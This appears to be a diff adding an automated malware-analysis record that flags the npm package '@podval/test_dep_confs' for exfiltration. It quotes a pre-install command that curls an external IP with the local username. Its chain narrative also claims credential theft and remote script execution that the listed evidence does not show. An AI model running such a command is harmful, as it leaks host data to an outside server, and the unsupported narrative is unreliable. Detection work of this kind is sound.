@@ -1,0 +1,55 @@
+{
+  "package_name": "@podval/test_dep_confs",
+  "version": "1.0.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "network_exfiltration"
+    ],
+    "behaviors": [
+      {
+        "category": "network_exfiltration",
+        "summary": "The malicious code is attempting to exfiltrate sensitive data over the network.",
+        "details": "The malicious code is making a network request to an external IP address '34.141.82.227' during the pre-installation of the package.",
+        "confidence": 0.83,
+        "evidence_apis": [],
+        "evidence_files": [],
+        "evidence_domains": [
+          "34.141.82.227"
+        ],
+        "evidence_commands": [
+          "curl http://34.141.82.227/?whoami=$(whoami)"
+        ],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": "This JSON output indicates that the package '@podval/test_dep_confs' has a high level of confidence in its malicious intent, as indicated by the 'Confidence' score of 0.83. The malicious code is attempting to exfiltrate sensitive data over the network, as indicated by the 'network_exfiltration' category in the 'risk_vector'. The evidence for this malicious intent comes from the hardcoded external IP address '34.141.82.227' in the pre-installation script of the package. The specific command used for this malicious intent is 'curl http://34.141.82.227/?whoami=$(whoami)'."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads env credentials, POST to external domain, install hook downloads remote script, execute it",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package purpose is not clear, it seems like it might be involved in exfiltrating sensitive data over the network",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.7,
+      "explanation": "Based on the evidence, the package seems to have a high level of confidence in its malicious intent, as indicated by the 'Confidence' score. The malicious code is attempting to exfiltrate sensitive data over the network, as indicated by the 'network_exfiltration' category in the 'risk_vector'. The evidence for this malicious intent comes from the hardcoded external IP address '34.141.82.227'."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 0.7773,
+    "confirmed_signals_count": 2,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T09:56:29.340768"
+}
